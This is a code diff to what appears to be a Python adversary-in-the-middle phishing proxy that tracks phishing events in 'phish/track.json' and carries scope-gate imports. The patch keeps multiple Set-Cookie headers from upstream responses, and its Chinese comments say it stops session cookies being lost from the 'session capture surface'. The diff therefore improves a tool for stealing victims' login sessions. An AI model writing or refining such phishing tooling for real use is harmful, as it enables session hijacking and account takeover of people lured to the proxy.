@@ -25,6 +25,15 @@ from _common import _data_root, scope_gate_full, edusrc_gate_phish as edusrc_gat
 
 DB_FILE = os.path.join(_data_root(), 'phish/track.json')  # CS12-N1: 批次 R 恢复时误删, 补回
 
+def _multi_setcookie(hdrs, raw_headers):
+    # R32D93-N1: dict(headers) 折叠重复键——多值 Set-Cookie 三吞二,
+    # 会话捕获面永失首表外 cookie。list 传递, _respond 逐条展开。
+    sc = raw_headers.get_all('Set-Cookie') if hasattr(raw_headers, 'get_all') else None
+    if sc and len(sc) > 1:
+        hdrs['Set-Cookie'] = sc
+    return hdrs
+
+
 def load_db():
     try: return json.load(open(DB_FILE))
     except: return {'events': []}
@@ -82,9 +91,9 @@ class ProxyHandler(BaseHTTPRequestHandler):
         try:
             req = Request(url, data=body, headers=headers, method=method)
             resp = urlopen(req, timeout=15)
-            return resp.status, dict(resp.headers), resp.read()
+            return resp.status, _multi_setcookie(dict(resp.headers), resp.headers), resp.read()
         except HTTPError as e:
-            return e.code, dict(e.headers), e.read()
+            return e.code, _multi_setcookie(dict(e.headers), e.headers), e.read()
         except URLError as e:
             return 502, {}, f'Proxy error: {e}'.encode()
 
@@ -154,7 +163,8 @@ class ProxyHandler(BaseHTTPRequestHandler):
         # 转发全头致双份 Server/Date 畸形应答+泄漏代理栈)。
         for k, v in headers.items():
             if k.lower() not in ('transfer-encoding', 'content-length', 'server', 'date'):
-                self.send_header(k, v)
+                for one in (v if isinstance(v, list) else [v]):  # R32D93-N1: 多值逐条
+                    self.send_header(k, one)
         self.send_header('Content-Length', str(len(body)))
         self.end_headers()
         self.wfile.write(body)
